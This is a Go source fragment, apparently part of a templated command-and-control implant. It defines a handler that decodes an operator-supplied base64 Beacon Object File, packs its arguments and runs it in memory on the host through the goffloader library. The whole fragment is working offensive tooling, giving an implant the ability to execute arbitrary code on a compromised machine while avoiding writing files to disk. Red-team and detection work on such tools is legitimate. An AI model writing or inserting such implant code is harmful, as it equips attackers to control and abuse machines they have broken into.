import (
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/praetorian-inc/goffloader/src/coff"
	"github.com/praetorian-inc/goffloader/src/lighthouse"
)

// BOF execution functionality
func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 3) // Split into at most 3 parts: ['bof', 'encoded_bof', 'args']
	if len(parts) < 2 {
		return "[ERROR] Invalid BOF command format. Usage: bof <base64_encoded_bof> [args...]"
	}

	encodedBOF := parts[1]
	bofArgs := ""
	if len(parts) > 2 {
		bofArgs = parts[2]
	}

	// Decode the base64-encoded BOF
	bofBytes, err := base64.StdEncoding.DecodeString(encodedBOF)
	if err != nil {
		return fmt.Sprintf("[ERROR] Invalid BOF data format: %v", err)
	}

	// Parse and prepare BOF arguments using lighthouse module
	var args []string
	if bofArgs != "" {
		argParts := strings.Fields(bofArgs)
		// Common types: 'z' for null-terminated strings, 'i' for integers, etc.
		for _, argPart := range argParts {
			args = append(args, "z"+argPart) // Default to null-terminated string
		}
	}

	// Pack the arguments using lighthouse
	argBytes := []byte{}
	if len(args) > 0 {
		argBytes, err = lighthouse.PackArgs(args)
		if err != nil {
			return fmt.Sprintf("[ERROR] Failed to pack BOF arguments: %v", err)
		}
	}

	// Execute the BOF in-memory using goffloader
	output, err := coff.Load(bofBytes, argBytes)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to execute BOF: %v", err)
	}

	if output == "" {
		return "[SUCCESS] BOF executed with no output"
	}

	return output
}